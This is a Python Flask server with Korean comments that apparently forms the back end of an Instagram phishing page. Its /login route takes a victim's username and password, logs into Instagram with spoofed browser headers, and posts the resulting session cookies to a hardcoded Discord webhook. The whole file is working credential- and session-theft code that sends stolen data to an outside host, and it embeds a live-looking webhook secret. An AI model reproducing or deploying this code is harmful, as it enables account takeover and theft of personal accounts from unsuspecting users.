from flask import Flask, request, jsonify, render_template
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # 모든 도메인에서 요청 허용

# 디스코드 웹훅 URL을 여기에 넣으세요
WEBHOOK_URL = 'https://discord.com/api/webhooks/1405032913958867115/m-psbA0NsQIHpHkX0NxIEjfcQKe48K0tuH88gjFXajDPV4brvTdRiqQx9ng-E8-hQSha'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'status': 'error', 'message': '아이디와 비밀번호를 입력하세요.'}), 400

    headers = {
        'host': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'x-asbd-id': '129477',
        'x-csrftoken': 'CW2Q00bvaKhSGobrrr0Q1U',  # 크롬에서 추출 필요
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1012029991',
        'x-requested-with': 'XMLHttpRequest',
    }

    session = requests.Session()
    try:
        response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data={
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
            'username': username,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        })

        resp_json = response.json()

        if resp_json.get('authenticated'):
            # 세션 쿠키 추출
            cookies = session.cookies.get_dict()
            cookies_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])

            # 디스코드 웹훅으로 쿠키 전송
            requests.post(WEBHOOK_URL, json={
                'content': f'인스타 쿠키:\n```{cookies_str}```'
            })

            return jsonify({'status': 'success', 'message': '쿠키 전송 완료'})
        else:
            return jsonify({'status': 'fail', 'message': '로그인 실패'}), 401
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)